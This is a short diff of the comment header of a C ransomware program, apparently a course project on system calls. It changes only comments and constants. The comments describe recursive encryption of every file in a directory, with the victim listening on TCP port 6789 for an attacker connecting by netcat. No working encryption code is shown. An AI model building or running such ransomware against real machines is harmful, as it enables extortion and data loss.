@@ -2,13 +2,9 @@
  * PROYECTO: Ransomware
  * CURSO: Lenguaje C y llamadas al sistema
  * 
- * Este programa ejecuta las acciones basicas del malware
- * catalogado como ransomware y se encarga del secuestro
- * de archivos a traves de cifrado y descifrado de estos.
- * 
- * Para su ejecucion solo se tiene que compilar y correr
- * en el directorio en que se pretende realizar el cifrado
- * recursivo.
+ * Ransomware sayCYA. Cifra y descifra recursivamente todos los archivos
+ *en el directorio donde se encuentre el ejecutable. Se realiza a traves de
+ *sockets TCP.
  * En otra terminal o en otra maquina (atacante) con conexion 
  * a la maquina que lo esta ejecutando (victima), realizar la
  * conexion con netcat mediante la ip de la afectada y el 
@@ -35,7 +31,9 @@
 #include <fcntl.h>  //para usar funcion open
 #define BUF_SIZE 4096 // Buffer
 
+//Puerto donde escuchara el socket de la victima
 #define PORT 6789
+//Longitud de la cadena que almacena direcciones de los archivos
 #define length_path 200
 #define pad_size 3		//tamano en KB del archivo pad.pad
 
